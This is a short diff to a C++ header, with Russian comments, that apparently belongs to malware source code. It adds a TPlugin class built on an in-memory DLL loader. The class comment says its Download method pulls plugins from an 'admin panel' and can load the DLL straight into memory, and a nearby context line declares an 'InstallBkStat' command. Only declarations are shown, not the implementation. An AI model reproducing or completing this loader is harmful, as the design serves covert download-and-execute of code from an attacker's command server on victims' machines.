@@ -9,6 +9,7 @@
 //---------------------------------------------------------------------------
 
 #include "windows.h"
+#include "DllLoader.h"
 
 //*****************************************************************************
 //  Методы для работы с плагинами
@@ -170,6 +171,36 @@ namespace Plugin
 	bool ExecuteInstallBkStat(void* Manager, PCHAR Command, PCHAR Args);
 }
 
+
+
+//--------------------------------------------------
+//  TPlugin - класс для упрощения работы с плагинами
+//--------------------------------------------------
+class TPlugin : public TMemoryDLL
+{
+private:
+	string FName;
+	LPVOID FData;
+	DWORD  FSize;
+public:
+	TPlugin(const char*   PluginName);
+	TPlugin(const string& PluginName);
+	~TPlugin();
+
+	//------------------------------------------
+	//  Download - функция скачивает плагин из
+	//             админки и, при необходимости,
+	//             загружает в память скачанную
+	//             длл
+	//
+	//  LoadLibrary - признак необходимости
+	//                загрузки скачанно длл
+	//------------------------------------------
+	bool Download(bool LoadLibrary);
+
+	LPVOID inline Data() { return FData; }
+	DWORD  inline Size() { return FSize; }
+};
 
 
 //---------------------------------------------------------------------------
